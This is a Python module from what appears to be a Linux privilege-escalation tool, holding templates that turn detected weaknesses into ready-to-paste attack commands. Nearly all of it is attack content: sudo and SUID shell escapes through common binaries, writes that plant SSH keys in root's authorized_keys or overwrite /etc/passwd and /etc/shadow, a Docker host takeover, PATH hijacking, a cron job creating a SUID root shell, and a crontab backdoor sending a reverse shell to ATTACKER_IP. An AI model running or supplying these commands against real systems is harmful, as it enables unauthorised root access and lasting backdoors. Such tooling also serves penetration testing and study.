"""
nullpeas/core/exploit_templates.py

This module translates abstract offensive primitives into concrete, 
copy-pasteable command strings for the operator.

It serves as the "Action Engine" for the Attack Chains.
"""

from typing import List, Dict, Tuple, Optional
from nullpeas.core.offensive_schema import Primitive

# ===========================================================================
# COMMAND TEMPLATES
# Format: (binary_name, capability_type): "template_string"
# ===========================================================================

TEMPLATES: Dict[Tuple[str, str], str] = {
    # === Sudo: Shell Escapes (capability="shell_spawn") ===
    ("vim", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("vi", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("nano", "shell_spawn"): "sudo {binary}\n# Inside nano: Ctrl+R, Ctrl+X, then type: reset; sh 1>&0 2>&0",
    ("less", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside less: !/bin/sh",
    ("more", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside more: !/bin/sh",
    ("man", "shell_spawn"): "sudo {binary} man\n# Inside man: !/bin/sh",
    ("find", "shell_spawn"): "sudo {binary} . -exec /bin/sh \\; -quit",
    ("awk", "shell_spawn"): "sudo {binary} 'BEGIN {system(\"/bin/sh\")}'",
    ("nmap", "shell_spawn"): "echo 'os.execute(\"/bin/sh\")' > /tmp/shell.nse && sudo {binary} --script=/tmp/shell.nse",
    ("python", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("python3", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("perl", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\";'",
    ("ruby", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\"'",
    ("lua", "shell_spawn"): "sudo {binary} -e 'os.execute(\"/bin/sh\")'",
    ("gdb", "shell_spawn"): "sudo {binary} -nx -ex '!sh' -ex quit",
    ("ftp", "shell_spawn"): "sudo {binary}\n# Inside ftp: !/bin/sh",
    ("scp", "shell_spawn"): "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo {binary} -S $TF x y:",
    ("systemctl", "platform_control"): "sudo {binary} list-units\n# (Requires creating a malicious service unit file)",
    
    # === Sudo: File Writes (capability="file_write") ===
    ("tee", "file_write"): "echo 'ssh-rsa AAAAB3...' | sudo {binary} -a /root/.ssh/authorized_keys",
    ("dd", "file_write"): "echo 'evil' | sudo {binary} of=/etc/ld.so.preload",
    ("cp", "file_write"): "sudo {binary} /tmp/evil_passwd /etc/passwd",
    ("mv", "file_write"): "sudo {binary} /tmp/evil_shadow /etc/shadow",
    
    # === SUID: Known Shell Spawners (capability="suid_shell") ===
    ("bash", "suid_shell"): "{binary} -p",
    ("sh", "suid_shell"): "{binary} -p",
    ("env", "suid_shell"): "{binary} /bin/sh -p",
    ("python", "suid_shell"): "{binary} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    ("python3", "suid_shell"): "{binary} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    ("perl", "suid_shell"): "{binary} -e 'exec \"/bin/sh\";'",
    
    # === Docker ===
    ("docker", "host_takeover"): "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    
    # === Cron ===
    ("cron", "writable_script"): "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {target}\n# Wait for cron...",
    ("cron", "user_persistence"): "(crontab -l; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"') | crontab -",

    # === PATH Hijack ===
    ("path", "hijack"): "echo -e '#!/bin/bash\\n/bin/bash -p' > {target}/<TARGET_BINARY>\nchmod +x {target}/<TARGET_BINARY>",
}


def _get_template(binary: str, capability: str) -> Optional[str]:
    # 1. Exact match
    if (binary, capability) in TEMPLATES:
        return TEMPLATES[(binary, capability)]
    
    # 2. Sudo fallback (many editors behave similarly)
    if capability == "shell_spawn" and binary in ["ed", "ex"]:
        return "sudo {binary}\n# Inside editor: !/bin/sh"

    return None


def generate_exploit_for_chain(p: Primitive) -> List[str]:
    """
    Generates a list of suggested command strings for a given primitive.
    """
    cmds = []
    
    # Context extraction
    binary = p.context.get("binary")
    path = p.context.get("binary_path") or binary
    
    # === 1. ROOT SHELL PRIMITIVES (Sudo / SUID) ===
    if p.type in {"root_shell_primitive", "suid_primitive"}:
        
        # A. Sudo (ALL) ALL
        if p.surface == "sudo" and p.context.get("is_all_rule") and p.context.get("nopasswd"):
            cmds.append("sudo su -")
            return cmds
            
        # B. Binary Specific
        if binary:
            # 1. Check for specific SUID shell escape
            if p.surface == "suid":
                tpl = _get_template(binary, "suid_shell")
                if tpl:
                    cmds.append(tpl.format(binary=path))
                    return cmds

                # If no specific SUID template, but it's a known shell spawner (like vim),
                # we can reuse the "shell_spawn" template but STRIP "sudo " from the start.
                tpl_sudo = _get_template(binary, "shell_spawn")
                if tpl_sudo:
                    # e.g. "sudo vim -c ..." -> "vim -c ..."
                    clean_cmd = tpl_sudo.replace("sudo {binary}", "{binary}")
                    cmds.append(clean_cmd.format(binary=path))
                    return cmds
                
                # Generic SUID fallback (unknown binary)
                cmds.append(f"{path} # (Try known args like -p, --shell, or reverse engineering)")

            # 2. Check for Sudo shell escape
            elif p.surface == "sudo":
                tpl = _get_template(binary, "shell_spawn")
                if tpl:
                    cmds.append(tpl.format(binary=path))

    # === 2. DOCKER HOST TAKEOVER ===
    elif p.type == "docker_host_takeover":
        if p.conditions.get("requires_docker_cli"):
            cmds.append(TEMPLATES[("docker", "host_takeover")])
        else:
            socket = p.affected_resource or "/var/run/docker.sock"
            cmds.append(f"curl -XPOST --unix-socket {socket} -d '{{...}}' http://localhost/containers/create")

    # === 3. ARBITRARY FILE WRITE ===
    elif p.type == "arbitrary_file_write_primitive":
        if binary:
            tpl = _get_template(binary, "file_write")
            if tpl:
                cmds.append(tpl.format(binary=path))

    # === 4. CRON EXECUTION ===
    elif p.type == "cron_exec_primitive":
        target = p.context.get("target_file")
        if target:
            tpl = TEMPLATES[("cron", "writable_script")]
            cmds.append(tpl.format(target=target))
    
    elif p.type == "cron_user_persistence_surface":
        # Backdoor current user's crontab
        cmds.append(TEMPLATES[("cron", "user_persistence")])

    # === 5. PATH HIJACKING ===
    elif p.type == "path_hijack_surface":
        target_dir = p.affected_resource
        if target_dir:
            tpl = TEMPLATES[("path", "hijack")]
            cmds.append(tpl.format(target=target_dir))
            cmds.append("# Replace <TARGET_BINARY> with a binary name typically run by root (e.g. 'ls', 'cat', 'python')")

    return cmds
